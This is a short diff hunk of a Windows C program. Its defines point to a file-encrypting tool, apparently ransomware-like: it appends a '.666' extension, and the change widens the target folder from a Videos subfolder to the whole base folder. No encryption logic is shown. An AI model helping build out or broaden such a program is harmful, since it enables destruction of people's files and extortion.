@@ -2,7 +2,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <Windows.h>
-#define RELATIVE_FOLDER "\\Videos"
+#define RELATIVE_FOLDER "\\"
 #define CRYPTO_EXT ".666"
 #define CRYPTO_EXT_LEN 4
 #define CRYPTO_ENV_VALUE "666" /* i will make this more secure */
